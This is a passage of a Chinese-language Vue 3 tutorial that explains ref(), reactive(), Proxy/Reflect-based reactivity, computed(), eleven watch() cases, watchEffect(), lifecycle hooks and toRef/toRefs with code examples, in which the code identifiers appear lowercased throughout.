}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ref()\n\n上面例子中的readersnumber它是一个响应式数据。它使用了ref()这个新函数（这可不是节点中的ref属性），该函数返回的是一个对象（响应式引用）。这个对象有个value属性，是响应式数据的值，可以在js代码中拿到这个value进行修改，就能通知用到该数据的模板去diff。\n\n例如readersnumber.value = 1，这个有点像react中的setstate()了。如果是在模板中就直接用该数据，不用.value。\n\n<template>\n  \x3c!-- 不用.value，直接用 --\x3e\n  <div>姓名：{{name}}</div>\n  <button type=\"button\" @click=\"handleclick\">点我</button>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst name = ref('张三')\n// 需要.value\nconst handleclick = () => name.value = '李四'\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n如果这响应式数据是个对象呢，在js中用的时候对象是有value的，它的属性就不需要使用value了\n\n<template>\n  <div>姓名：{{obj.name}}</div>\n  <button type=\"button\" @click=\"handleclick\">点我</button>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst obj = ref({\n  name: '张三',\n  age: 18\n})\nconst handleclick = () => obj.value.name = '李四'\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果你在控制台打印name和obj会发现，它们的value有些不一样，obj的value是个proxy类型的对象，其实是通过vue3提供的reactive()处理成proxy对象的。\n\n\n\n\n# reactive()\n\nreactive()新函数一般用于声明一个对象类型（准确说是复杂类型）的响应式数据，而ref()大多声明一个基本类型的响应式数据。\n\nreactive()新函数返回的是一个proxy类型的对象，它如果在js中修改值就不需要value，因为它其实是个代理对象，通过代理对象.属性名就能拿到对应的属性值，具体下一节会讲proxy代理，我们看一下reactive()使用的例子。\n\n<template>\n  \x3c!-- 不用.value，直接用 --\x3e\n  <div>姓名：{{obj.name}}</div>\n  <div>{{obj.a.b}} || {{obj.a.c.d}}</div>\n  <button type=\"button\" @click=\"handleclick\">点我</button>\n</template>\n\n<script setup>\nimport { reactive } from 'vue'\n\nconst obj = reactive({\n  name: '张三',\n  a: {\n      b: 1,\n      c: {\n          d: 2\n      }\n  }\n})\n// 不用.value了，直接取这个属性\nconst handleclick = () => {\n    obj.name = '李四'\n    obj.a.b = 3       // 深层次的也能被监测到\n    obj.a.c.d = 4     // 深层次的也能被监测到\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n我们再看一下reactive()里使用数组，返回的这个对象可以用索引修改某项，不再局限于“vue2中数组类型响应式数据只能使用8个方法来维持响应式”，也不用额外使用this.$set或者vue.set了。\n\n<template>\n  <ul>\n    <li v-for=\"item in arr\" :key=\"item.id\">名字：{{item.name}}</li>\n  </ul>\n  <button type=\"button\" @click=\"handleclick\">点我</button>\n</template>\n\n<script setup>\nimport { reactive } from 'vue'\n\nconst arr = reactive([{id:'1',name:'张三'},{id:'2',name:'李四'},{id:'3',name:'王五'}])\n// 可以直接通过索引修改数组某项了，不用再通过this.$set了\nconst handleclick = () => {\n    arr[0] = {id:'4',name:'赵六'}\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 简单说说vue3的响应式\n\n我们回顾一下vue2的响应式，可以在vue.js搜一下proxy或者initdata，可以看到如下代码，源对象是this._data.xxx和this._props.yyy，而使用的代理对象是this.xxx和this.yyy，也就可以在methods等地方使用代理对象this.xxx和this.yyy，模板中使用就去掉了this。而真正的响应式处理是下面第二段代码，用了一个observer观察者，在设置数据时会通知（dep.notify()）模板去diff。\n\n/**\n * target是this也就是vm，sourcekey这里是_data（或者_props），key是xxx某个属性\n * 意思是让this.xxx作为this._data.xxx的代理对象。读取this.xxx的属性其实就是\n * 读取this._data.xxx的属性，设置this.xxx的属性其实就是设置this._data.xxx的属性\n*/\nfunction proxy(target, sourcekey, key) {\n    // getter\n    sharedpropertydefinition.get = function proxygetter() {\n        return this[sourcekey][key]\n    };\n    // setter\n    sharedpropertydefinition.set = function proxysetter(val) {\n        this[sourcekey][key] = val;\n    };\n    // 添加key，并设置特性\n    object.defineproperty(target, key, sharedpropertydefinition);\n}\n// 上面这段代码是1.vue基础的“二、vue的mvvm和数据代理”内容，下面这段代码是1.vue基础的“七、vue的数据监视”内容\n\n/**\n *  obj是this._data，key就是this._data.xxx，重点就是setter里的dep.notify()\n *  当开发人员修改this.xxx是也会让this._data.xxx修改（上面的代码试想的），又由于下面的\n *  代码，在this._data.xxx修改时会dep.notify()通知模板去diff根据结果来是否重新渲染页面\n*/\nfunction definereactive$$1(obj, key, val, customsetter, shallow) {\n    // 读取obj对象里key属性的特性\n    var property = object.getownpropertydescriptor(obj, key);\n    if (property && property.configurable === false) return\n    var getter = property && property.get;\n    var setter = property && property.set;\n    // val是重点，下面的getter和setter最后都是访问的val，它是中间量\n    if ((!getter || setter) && arguments.length === 2) {\n        val = obj[key];\n    }\n    // 多层级的对象暂时不考虑，这个会用到递归\n    // var childob = !shallow && observe(val);\n    // 修改obj对象里key属性的特性\n    object.defineproperty(obj, key, {\n        enumerable: true,\n        configurable: true,\n        get: function reactivegetter() {\n            return getter ? getter.call(obj) : val;\n        },\n        set: function reactivesetter(newval) {\n            setter ? setter.call(obj, newval) : (val = newval);\n            // 触发更新\n            dep.notify();\n        }\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n看上面的代码你还可以明确一点，一切都是围绕着对象的属性来做文章的（而且只能get和set，删除属性和追加属性就不行了），这也是数组类型的响应式对象使用索引去修改为什么不行，并且vue2还重写了数组的那8个方法来实现响应式。\n\n简单复习一下proxy和reflect。const proxy = new proxy(target, handler)，target是源对象，proxy是代理对象，handler是处理器对象。如果这个处理器对象是个{}空字面量对象的话，那就和上面function proxy(target, sourcekey, key)自定义函数一样，只是单纯的“数据转发”。这个es6提供的proxy的优势在于，它是es6原生提供的函数，功能强大稳定（意思是不止能监视get和set，还有delete等等方法），然后target可以是任何类型的对象（包括原生数组、函数，甚至另一个代理），object.defineproperty其实只针对于对象的属性对于数组就爱莫能助了。\n\nconst arr = [{id:'1',name:'张三'},{id:'2',name:'李四'},{id:'3',name:'王五'}];\nconst proxy = new proxy(arr, {\n  set(target, prop, val) {\n    target[prop] = val\n    console.log('通知模板去diff')\n    return true\n  }\n});\nproxy[0] = {id:'4',name:'赵六'}\nconsole.log('arr', arr);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n那么reflect又是什么呢？它是一个反射，可以很方便对对象进行“增删改查”，其中对象本身的“查”和“改”很容易，而“增”和“删”就不是那么方便了，例如删除一个属性要使用delete obj.xxx，追加一个属性要object.defineproperty(obj, 'xxx', { ... })。而reflect比较统一：\n\nconst obj = { name: '张三' };\nconsole.log('读取name属性值: ', reflect.get(obj, 'name'));\nreflect.set(obj, 'name', '李四')\nconsole.log('修改name属性值: ', obj.name);\nconsole.log('删除name属性是否成功: ', reflect.deleteproperty(obj, 'name'));\nconsole.log('name属性值: ', obj.name);\nconsole.log('新增age属性是否成功: ', reflect.defineproperty(obj, 'age', {\n    get: () => 18\n}));\nconsole.log('age属性值: ', obj.age);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nreflect的第一个好处是多次reflect.defineproperty不会报错并且返回结果，而object.defineproperty(obj, 'xxx', { ... })多次就会报错得使用try catch进行异常捕获。reflect的第二个好处是，能用receiver处理this。\n\nlet user = {\n  _name: \"guest\",\n  get name() {\n    return this._name;\n  }\n};\n\nlet userproxy = new proxy(user, {\n  get(target, prop, receiver) {\n    // return reflect.get(target, prop, receiver)\n    return target[prop]; // (*) target = user\n  }\n});\n\nlet admin = {\n  __proto__: userproxy,\n  _name: \"admin\"\n};\n\n// 期望输出：admin\nconsole.log(admin.name); // 输出：guest (?!?)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n上面这个代码，admin.name通过原型找到userproxy，通过代理找到user上的get name，而这个get name里的this自然就是上下文对象user，那么就会输出user._name的值guest。如果要reflect进行代码修改*号那行就改为return reflect.get(target, prop, receiver)，这个receiver就会让实际的get name方法的this指向代理对象userproxy所在的上下文对象也就是admin，那么最后就会输出admin。\n\nvue3的相关源码可以搜function reactive\n\n// 我们只看get/set\nconst set = /*#__pure__*/ createsetter();\nconst get = /*#__pure__*/ creategetter();\nconst mutablehandlers = {\n    get,\n    set,\n    /* 省略... */\n};\n// 响应式数据\nfunction reactive(target) {\n    if (target && target[\"__v_isreadonly\" /* is_readonly */]) {\n        return target;\n    }\n    return createreactiveobject(target, false, mutablehandlers, mutablecollectionhandlers, reactivemap);\n}\n// 生成响应式数据，看basehandlers也就是上面的mutablehandlers\nfunction createreactiveobject(target, isreadonly, basehandlers, collectionhandlers, proxymap) {\n    /* 省略... */\n    // 我们看targettype为1（object和array的场景），也就是basehandlers\n    const proxy = new proxy(target, targettype === 2 /* collection */ ? collectionhandlers : basehandlers);\n    proxymap.set(target, proxy);\n    return proxy;\n}\n// 修改响应式数据时\nfunction createsetter(shallow = false) {\n    return function set(target, key, value, receiver) {\n        /* 省略... */\n        const result = reflect.set(target, key, value, receiver);\n        // 触发effect（通知模板等）\n        trigger(target, \"set\" /* set */, key, value, oldvalue);\n        return result;\n    };\n}\n// 读取响应式数据时\nfunction creategetter(isreadonly = false, shallow = false) {\n      return function get(target, key, receiver) {\n          /* 省略... */\n          const res = reflect.get(target, key, receiver);\n          if (!isreadonly) {\n              // 添加effect\n              track(target, \"get\" /* get */, key);\n          }\n          if (isref(res)) {\n              const shouldunwrap = !targetisarray || !isintegerkey(key);\n              return shouldunwrap ? res.value : res;\n          }\n          if (isobject(res)) {\n              return isreadonly ? readonly(res) : reactive(res);\n          }\n          return res;\n      };\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\nproxy不支持对基本类型数据进行代理，所以基本类型数据还是简单的getter和setter，也就能解释之前的说的ref里传入对象，它的value是个proxy类型，而基本类型的不是proxy类型了。\n\n最后解释一下：\n\n * trigger是触发effect，track是添加effect，这个effect的意思是副作用，这里是用于通知模板重新渲染等一些功能。\n * 至于副作用，是“函数外部环境发生的交互”，例如网络请求、dom操作、订阅数据来源、写入文件系统、获取用户输入等。\n * 提到副作用就不得不提到纯函数，它有两个特点：\n   * 1)该函数不会对入参本身进行修改，必须得有return返回值；在相同的入参时，需产生相同的返回值。\n   * 2)该函数得没有副作用；返回值可以与入参无关（有关也可以），但是不能与入参以外的变量或者其他影响有关。\n\n\n# computed()\n\n计算属性用了computed()这个新函数，如果只有getter那就传递一个函数，使用这个计算属性时也需要.value（模板中不需要）。它是惰性的，意思是只在数据源发生改变时才执行里面的函数（多次访问计算属性，只要数据源没变就直接返回之前计算的值）。\n\n<template>\n  <div>counter: {{counter}}</div>\n  <div>newcounter: {{newcounter}}</div>\n  <button type=\"button\" @click=\"handleclick\">点我</button>\n</template>\n\n<script setup>\nimport { ref, computed } from 'vue'\n\nconst counter = ref(0)\n// 传递一个函数（getter）\nconst newcounter = computed(() => counter.value * 2);\nconst handleclick = () => {\n  counter.value++;\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果还有setter那么就得传递一个对象，具体看下面这个例子\n\n<template>\n  <div>姓: {{lastname}}</div>\n  <div>名: {{firstname}}</div>\n  <div>全名: {{fullname}}</div>\n  <button type=\"button\" @click=\"handleclick\">点我</button>\n</template>\n\n<script setup>\nimport { ref, computed } from 'vue'\n\nconst firstname = ref('三')\nconst lastname = ref('张')\n// 传递一个对象（要包含getter和setter）\nconst fullname = computed({\n  get: () => lastname.value +'|' + firstname.value,\n  set: (value) => {\n    const arr = value.split('|');\n    if (arr.length === 2) {\n      lastname.value = arr[0]\n      firstname.value = arr[1]\n    }\n  }\n})\nconst handleclick = () => {\n  fullname.value = '李|四';\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# watch()的十一种情况\n\n说实话vue3的watch()比较难玩，它在功效上和vue2的watch几乎一样，只是在用法上变化很大，情况会比较复杂。原因一是ref和reactive，原因二是watch()扩展了参数的写法。\n\n我们看一下watch()扩展参数的写法，wathc(数据, 回调函数)，这个“数据”有三种写法\n\n * 直接写ref对象或者reactive对象；\n * () => state.xxx，例如这种getter函数（getter/effect）；\n * [xxx, yyy]，例如这种数据列表（数组）。\n\n我们看下面演示的例子：\n\n<template>\n  <div><span>数值: {{count}}</span> || <button type=\"button\" @click=\"handleclick1\">点我</button></div>\n  <div><span>名字: {{lastname+firstname}}</span> || <button type=\"button\" @click=\"handleclick2\">点我</button></div>\n  \n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\n// 情况一：直接侦听ref\nconst count = ref(0)\nwatch(count, (count, prevcount) => {\n  console.log('直接侦听ref。 count', count, ', prevcount: ', prevcount);\n})\n\n// 情况二：侦听一个getter（ref），注意count此时要带上.value\nwatch(() => count.value, (count, prevcount) => {\n    console.log('侦听一个getter。 count: ', count, ', prevcount: ', prevcount);\n  }\n)\n// 情况三：侦听一组ref\nconst firstname = ref('三')\nconst lastname = ref('张')\nwatch(\n  [firstname, lastname],\n  (newvalues, prevvalue) => {\n    console.log('名字改变了, newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }\n)\nconst handleclick1 = () => { count.value++; }\nconst handleclick2 = () => { firstname.value += '?'; lastname.value += '!' }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n * 情况一，直接侦听一个ref，常用于侦听基本类型的响应式数据，不用带上.value。\n * 情况二，侦听一个getter（ref），一般用于侦听ref的value。不太常用，一般直接用情况一就行了，不要多此一举。\n * 情况三，侦听一组ref，它们都不用带上.value，多个同时被修改，也只触发一次回调。\n\n以上三种情况还只是基本类型，也就是ref对象。如果涉及到复杂类型，又要分为ref对象和reactive对象，虽然不太推荐用ref()为对象创建响应式数据，但官方并没有对此做出约束。看一下演示例子。\n\n<template>\n  <div>\n    <span>person1: {{person1.name}} - {{person1.age}} - {{person1.mother.name}} - {{person1.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleclick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleclick2\">点我2</button>\n  </div>\n  <div>\n    <span>person2: {{person2.name}} - {{person2.age}} - {{person2.mother.name}} - {{person2.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleclick3\">点我3</button> || \n    <button type=\"button\" @click=\"handleclick4\">点我4</button>\n  </div>\n  <div>\n    <span>obj1.a: {{obj1.a}} - obj1.b.c: {{obj1.b.c}}</span> || \n    <button type=\"button\" @click=\"handleclick5\">点我5</button> || \n    <button type=\"button\" @click=\"handleclick6\">点我6</button>\n  </div>\n  <div>\n    <span>obj2.d: {{obj2.d}} - obj2.e.f: {{obj2.e.f}}</span> || \n    <button type=\"button\" @click=\"handleclick7\">点我7</button> || \n    <button type=\"button\" @click=\"handleclick8\">点我8</button>\n  </div>\n</template>\n\n<script setup>\nimport { reactive, watch } from 'vue'\n\nconst person1 = reactive({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\n// 情况四：侦听一个reactive\nwatch(person1, (newvalues, prevvalue) => {\n    console.log('侦听一个reactive。 newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }\n)\nconst person2 = reactive({\n  name: '李四',\n  age: 19,\n  mother: {name:'王雪',age: 39}\n})\n// 情况五：侦听一个getter（reactive）\nwatch(() => person2.age, (newvalues, prevvalue) => {\n    console.log('侦听一个getter（reactive）。 newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }\n)\nconst obj1 = reactive({a: 'a', b: {c: 'c'}});\nconst obj2 = reactive({d: 'd', e: {f: 'f'}})\n// 情况六：侦听一组reactive\nwatch([obj1, obj2], (newvalues, prevvalue) => {\n    console.log('侦听一组reactive。 newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }\n)\nconst handleclick1 = () => { person1.age++; }\nconst handleclick2 = () => { person1.mother.age++; }\nconst handleclick3 = () => { person2.age++; }\nconst handleclick4 = () => { person2.mother.age++; }\nconst handleclick5 = () => { obj1.a+='a'; }\nconst handleclick6 = () => { obj1.b.c+='c'; }\nconst handleclick7 = () => { obj2.d+='d'; }\nconst handleclick8 = () => { obj2.e.f+='f'; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n * 情况四，直接侦听一个reactive，不管修改层次有多深的属性，它都能侦听到。\n * 情况五，侦听一个getter（reactive），一般用于侦听reactive对象的某个属性，这种很常见了。\n * 情况六，侦听一组reactive，类似情况四，它们其实有一个小问题。\n\n情况四和情况六有个小问题，那就是回调函数里的newvalues, prevvalue两对象一直是同一个，你想要前一份状态值需要做一下优化。需要先深克隆一下源响应式对象，然后用getter返回这个新对象，情况七如下。\n\n<template>\n  <div>\n    <span>obj1.a: {{obj1.a}} - obj1.b.c: {{obj1.b.c}}</span> || \n    <button type=\"button\" @click=\"handleclick5\">点我5</button> || \n    <button type=\"button\" @click=\"handleclick6\">点我6</button>\n  </div>\n  <div>\n    <span>obj2.d: {{obj2.d}} - obj2.e.f: {{obj2.e.f}}</span> || \n    <button type=\"button\" @click=\"handleclick7\">点我7</button> || \n    <button type=\"button\" @click=\"handleclick8\">点我8</button>\n  </div>\n</template>\n\n<script setup>\nimport { reactive, watch } from 'vue'\n// yarn add lodash@4\nimport clonedeep from 'lodash/clonedeep';\n\nconst obj1 = reactive({a: 'a', b: {c: 'c'}});\nconst obj2 = reactive({d: 'd', e: {f: 'f'}})\n// 情况七：侦听一组reactive，如果是person的话就是 () => clonedeep(person)\nwatch(() => [clonedeep(obj1), clonedeep(obj2)], (newvalues, prevvalue) => {\n    console.log('侦听一组reactive。 newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }\n)\nconst handleclick5 = () => { obj1.a+='a'; }\nconst handleclick6 = () => { obj1.b.c+='c'; }\nconst handleclick7 = () => { obj2.d+='d'; }\nconst handleclick8 = () => { obj2.e.f+='f'; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n然后就是用ref()为对象创建响应式数据，在侦听它时，要么使用.value，要么就配上{ deep: true }，情况八如下。\n\n<template>\n  <div>\n    <span>person: {{person.name}} - {{person.age}} - {{person.mother.name}} - {{person.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleclick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleclick2\">点我2</button>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst person = ref({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\n// 情况八：侦听一个“用ref()为对象创建响应式数据”。要么person.value，要么person + { deep: true }\nwatch(person, (newvalues, prevvalue) => {\n    console.log('侦听。 newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }, { deep: true }\n)\nconst handleclick1 = () => { person.value.age++; }\nconst handleclick2 = () => { person.value.mother.age++; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\ngetter的注意事项，其实看到这里可以跳过了，下面的情况很少见。上面的情况二里的getter是用于ref的value上的，上面的情况五里的getter是用于reactive的某层里某个属性的，上面的情况七里的getter是用于clonedeep后的对象。而如果getter直接用于ref或reactive对象本身的话，必须得配合{ deep: true }，这与上面的情况八是同样的道理，情况九、十、十一演示如下。\n\n<template>\n  <div><span>数值: {{count}}</span> || <button type=\"button\" @click=\"handleclick1\">点我1</button></div>\n  <div>\n    <span>person1: {{person1.name}} - {{person1.age}} - {{person1.mother.name}} - {{person1.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleclick2\">点我2</button> || \n    <button type=\"button\" @click=\"handleclick3\">点我3</button>\n  </div>\n  <div>\n    <span>person2: {{person2.name}} - {{person2.age}} - {{person2.mother.name}} - {{person2.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleclick4\">点我4</button> || \n    <button type=\"button\" @click=\"handleclick5\">点我5</button>\n  </div>\n</template>\n\n<script setup>\nimport { ref, reactive, watch } from 'vue'\n\nconst count = ref(0)\n// 情况九：侦听一个getter（ref），count没有带上.value，并且使用了deep: true\nwatch(() => count, (count, prevcount) => {\n    console.log('侦听一个getter（ref）。 count: ', count, ', prevcount: ', prevcount);\n  }, {deep: true}\n)\nconst person1 = reactive({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\n// 情况十：侦听一个getter（reactive），count没有带上.value，并且使用了deep: true\nwatch(() => person1, (newvalues, prevvalue) => {\n    console.log('侦听一个getter（reactive）。 newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }, {deep: true}\n)\nconst person2 = ref({\n  name: '李四',\n  age: 19,\n  mother: {name:'王雪',age: 39}\n})\n// 情况十一：侦听一个getter（ref-对象），count没有带上.value，并且使用了deep: true\nwatch(() => person2, (newvalues, prevvalue) => {\n    console.log('侦听一个getter（reactive）。 newvalues: ', newvalues, ', prevvalue: ', prevvalue);\n  }, {deep: true}\n)\nconst handleclick1 = () => { count.value++; }\nconst handleclick2 = () => { person1.age++; }\nconst handleclick3 = () => { person1.mother.age++; }\nconst handleclick4 = () => { person2.value.age++; }\nconst handleclick5 = () => { person2.value.mother.age++; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n情况九、十、十一，getter里直接返回一个ref对象或者reactive本身，一般是需要开启{deep: true}。这三种情况比较少见，因为用前面的情况可以替代，这里只是作为陷阱来讲的。\n\n总结一下watch()的用法：\n\n * 如果侦听的响应式数据是基本类型，那么watch()的第一个形参直接用ref对象本身就可以了，也就是情况一。（如果你非要.value那就搭配getter用法，也就是情况二）。\n * 如果侦听的响应式数据是复杂类型整体，那么watch()的第一个形参直接用reactive对象本身就可以了（它相当于自动开启了{deep:true}，如果你尝试手动用{deep:false}这是关闭不了的），也就是情况四。\n * 如果侦听的响应式数据是复杂类型的某个属性，那么watch()的第一个形参用getter配合reactive对象即可，也就是情况五。\n * 如果侦听的响应式数据是复杂类型整体并且还想知道它前一次的状态值，那么就需要getter配合reactive对象的深克隆对象，也就是情况七。\n * 如果想一次性侦听多个，那么watch()的第一个形参是一个数组，数组每一项最好是ref对象或者reactive对象或者reactive对象的克隆对象，具体情况看前面的描述。这一条是情况三和情况六\n * 至于其他情况，也就是情况八、九、十、十一或者其他衍生出来的情况，它们都能用前面的方式进行替代或者优化。\n\n\n# watcheffect()\n\n其实上一节的watch()更像react的useeffect()。\n\nwatcheffect()和watch()是同一个功能的两种不同形态，底层的实现是一样的，大致区别如下\n\n * watch()：\n   * 显式指定依赖源（手动指定），依赖源更新时执行回调函数。\n   * 不过它是惰性的，多个依赖源修改时，一般只触发一次回调函数（用nexttick可以多次）。\n   * 可以立即执行回调函数，但必须手动加上{immediate: true}。\n * watcheffect()：\n   * 自动收集依赖源（不用手动指定依赖项），依赖源更新时重新执行自身。\n   * 多个依赖源修改时，有几次修改就调用几次。\n   * 并且回调函数是立即执行，相当于{immediate: true}（不用手动加）。\n   * 在组件卸载时自动停止侦听，不仅如此还能手动停止。\n   * 还能使用清除函数（失效回调），在卸载时执行一次清除函数，也在副作用即将重新执行时调用一次清除函数（这个和react的useeffect返回一个清除函数很像，只不过vue3不是返回，而是形参）。\n   * 最后还能将回调函数调整到组件更新后再执行，需要在watcheffect()的第二个参数上写{flush: 'post'}（默认是{flush: 'pre'}也就是update前执行的），像react就不能调整，它是默认updated后执行。\n\n具体讲解如下（就理解为watch和watcheffect是react的useeffect拆分出来的两个功能把）：\n\n 1. watcheffect()依赖源的收集，以及回调函数的立即执行代码如下。\n    \n    watcheffect(\n      // 回调函数默认立即执行一次\n      () => console.log(counter.value) // 这里就是依赖项counter，但是是vue3自动帮你收集的\n    )\n    // 与上面的基本等价\n    watch(\n      () => counter.value, // 这里手动指定依赖是counter\n      () => console.log(counter.value), \n      { immediate: true } // 如果要立即执行一次，必须手动指定{ immediate: true }\n    )\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 2. 多个依赖源修改时，watcheffect()与watch()的区别。推荐在大部分时候用watch()显式的指定依赖以避免不必要的重复触发，也避免在后续代码修改或重构时不小心引入新的依赖。\n    \n    const counter = ref(0)\n    const enabled = ref(false)\n    \n    watcheffect(() => {\n      if (enabled.value)\n        console.log(counter.value)\n    })\n    \n    // (以下忽略 nexttick)\n    \n    // watcheffect 会被立即执行，因为 “enabled“ 为 false, 此时仅收集到 “enabled“ 依赖\n    counter.value += 1 // 无反应\n    \n    enabled.value = true // effect 触发，控制台出 \"1\"\n    counter.value += 1 // “counter“ 被作为新的依赖被收集，控制台出 \"2\"\n    \n    enabled.value = false // 函数被重新执行，无输出\n    counter.value += 1 // 函数被重新执行，无输出 (虽然 counter 已经没有用了，但是作为依赖还是会触发函数）\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n 3. watcheffect()组件卸载时自动停止侦听，也能手动停止。watch()做不到手动停止，watcheffect()的这种场景用的比较少。\n    \n    const stop = watcheffect(() => {\n      /* ... */\n    })\n    \n    // later\n    stop()\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 4. watcheffect()清除函数（失效回调）的使用场景。oninvalidate是watcheffect()的形参，而oninvalidate的入参就是我们声明的一个清除函数（失效回调），它会在组件卸载前执行一次，也会在副作用每次执行前调用一次，这就能保证先取消订阅后更新订阅。（这个和react的useeffectreturn一个清除函数很像，只不过vue3里不是return，而是形参）\n\nimport { reactive, watch, watcheffect } from 'vue'\nconst friend = reactive({id:1});\nlet prevfriendid = friend.id;\nwatch(() => friend.id, (newvalue, prevvalue) => {\n  prevfriendid = prevvalue;\n})\n// 唯一不方便的就是旧值得额外用prevfriendid存储。如果只用watch()，那就还需要onunmounted()钩子（vue2的beforedestroy）\nwatcheffect(oninvalidate => {\n  chatapi.subscribetofriendstatus(\n    friend.id,\n    handlestatuschange\n  );\n  // 除了这种场景，也可用来清除（中断）上一次请求，source.cancel('trigger')\n  oninvalidate(() => {\n    chatapi.unsubscribefromfriendstatus(\n      prevfriendid,\n      handlestatuschange\n    );\n  })\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# vue3的生命周期钩子\n\n\n\n选项式 api           hook inside setup\nbeforecreate      not needed*\ncreated           not needed*\nbeforemount       onbeforemount\nmounted           onmounted\nbeforeupdate      onbeforeupdate\nupdated           onupdated\nbeforeunmount     onbeforeunmount\nunmounted         onunmounted\nerrorcaptured     onerrorcaptured\nrendertracked     onrendertracked\nrendertriggered   onrendertriggered\nactivated         onactivated\ndeactivated       ondeactivated\n\nnot newded*：因为setup是围绕beforecreate和created生命周期钩子运行的，所以不需要显式地定义它们。换句话说，在这些钩子中编写的任何代码都应该直接在setup函数中编写。\n\n\n# toref()和torefs()\n\ntoref()创建一个ref对象，它的value值是另一个响应式对象的某个property属性。这个创建出来的re对象会保持对其源 property 的响应式连接。toref()用的最多的是，将某个属性单独传递给外部，自定义hooks中用的多。\n\nconst state = reactive({\n  foo: 1,\n  bar: 2\n})\n// 第一个参数是源响应式对象，第二个参数是属性名\nconst fooref = toref(state, 'foo')\n\n// fooref和state.foo的响应式连接一直存在\nfooref.value++\nconsole.log(state.foo) // 2\n\n// fooref和state.foo的响应式连接一直存在\nstate.foo++\nconsole.log(fooref.value) // 3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ntoref()是处理单个，而torefs()是处理源响应式对象所有的第一层属性。\n\nconst state = reactive({\n  foo: 1,\n  bar: 2\n})\nconst { foo, bar } = torefs(state) // 在自定义hooks中用的特别多，可以只返回一部分响应式的数据\n\n// ref 和原始 property 